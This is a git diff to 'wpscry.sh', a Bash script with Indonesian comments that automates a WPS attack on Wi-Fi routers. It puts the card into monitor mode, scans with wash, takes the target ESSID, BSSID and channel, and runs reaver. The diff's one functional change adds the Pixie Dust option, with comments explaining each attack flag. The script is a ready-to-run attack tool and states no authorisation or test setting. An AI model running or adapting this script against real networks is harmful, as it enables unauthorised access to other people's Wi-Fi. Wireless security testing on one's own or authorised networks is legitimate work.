@@ -32,7 +32,7 @@
 #      2. ./wpscry.sh
 #---------------------------------------------------------------------------------------------------------------------
 
-# fungsi untuk mengecek root
+# Fungsi untuk mengecek root.
 function cek_root(){
 	if [[ "$EUID" -ne 0 ]]; then
 		echo "[-] Script ini harus dijalankan sebagi root."
@@ -40,7 +40,7 @@ function cek_root(){
 	fi
 }
 
-# fungsi untuk mengecek alat yang diperlukan oleh wpscry
+# Fungsi untuk mengecek alat yang diperlukan oleh wpscry.
 function cek_alat(){
 
         daftar_alat_belum_terinstal=()
@@ -71,7 +71,7 @@ function cek_alat(){
         
 }
 
-# fungsi untuk membuat folder untuk menyimpan sesi dari alat reaver 
+# Fungsi untuk membuat folder 'sesi' untuk menyimpan sesi dari alat reaver.
 function buat_folder(){
         nama_folder="sesi"
 	if [[ ! -d "${nama_folder}" ]]; then
@@ -80,7 +80,7 @@ function buat_folder(){
         fi
 }
 
-# fungsi untuk mengatur interface yang ingin digunakan
+# Fungsi untuk mengatur interface yang ingin digunakan.
 function mengatur_interface(){
 	while true; do
 		read -p "Interface: " interface
@@ -99,7 +99,7 @@ function mengatur_interface(){
 	done
 }
 
-# fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur
+# Fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur.
 function mengaktifkan_mode_monitor(){
 		if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
 			echo "[+] Interface ${interface} sudah dalam mode monitor."
@@ -128,17 +128,17 @@ function mengaktifkan_mode_monitor(){
 		
 }
 
-# fungsi untuk memindai jaringan wps menggunakan alat wash
+# Fungsi untuk memindai jaringan wps menggunakan alat wash.
 function memindai_jaringan_wps(){
 	echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
 	echo ""
 	wash -i "${interface}"
 }
 
-# fungsi untuk mengatur target yang ingin di serang
+# Fungsi untuk mengatur target yang ingin di serang.
 function mengatur_target(){
 
-	# mengatur essid target
+	# Mengatur ESSID target
 	while true; do
 		read -p "ESSID: " essid
 		if [[ ! -z "${essid}" ]]; then
@@ -150,7 +150,7 @@ function mengatur_target(){
 		fi
 	done
 
-	# mengatur bssid target
+	# Mengatur BSIID target
 	while  true; do
 		read -p "BSSID: " bssid
 		if [[ ! -z "${bssid}" ]]; then
@@ -167,7 +167,7 @@ function mengatur_target(){
 		fi
 	done
 
-	# mengatur channel target
+	# Mengatur channel target
 	while true; do
 		read -p "Channel: " channel
 		if [[ ! -z "${channel}" ]]; then
@@ -186,31 +186,51 @@ function mengatur_target(){
 	read -p "Tekan [Enter] untuk memulai serangan..."
 }
 
-# fungsi untuk melakukan serangan terhadap target yang sudah diatur
+# Fungsi untuk melakukan serangan terhadap target yang sudah diatur.
 function menjalankan_serangan(){
         waktu=$(date "+%d-%m-%Y_%H:%M:%S")
         sesi="${nama_folder}/${essid}_${waktu}.session"
-	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}"
+	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -K 1 -vvv
+        #
+        # Keterangan:
+	#
+	# -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
+        # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
+	# -b   : Menentukan bssid (alamat MAC) dari router atau access point yang akan diserang.
+        # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
+	# -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
+        # -K   : Mengaktifkan mode serangan Pixie Dust (Pixie Dust attack). 
+	# -vvv : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
 }
 
-# fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur
+# Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
 function menonaktifkan_mode_monitor(){
         airmon-ng stop "${interface}" >> /dev/null 2>&1
 	systemctl restart NetworkManager
         exit 0
 }
 
-# fungsi utama wpscry
+# Fungsi utama wpscry.
 function wpscry(){
+        # Memanggil fungsi cek_root.
 	cek_root
+        # Memanggil fungsi cek_alat.
         cek_alat
+	# Memanggil fungsi buat_folder.
         buat_folder
+	# Memanggil fungsi mengatur_interface.
 	mengatur_interface
+        # Memanggil fungsi mengaktifkan_mode_monitor.
 	mengaktifkan_mode_monitor
+        # Memanggil fungsi memindai_jaringan_wps.
 	memindai_jaringan_wps
+        # Memanggil fungsi mengatur_target.
 	mengatur_target
+        # Memanggil fungsi menjalankan_serangan.
 	menjalankan_serangan
+        # Memanggil fungsi menonaktifkan_mode_monitor.
         menonaktifkan_mode_monitor
 }
 
+# Memanggil fungsi wpscry.
 wpscry
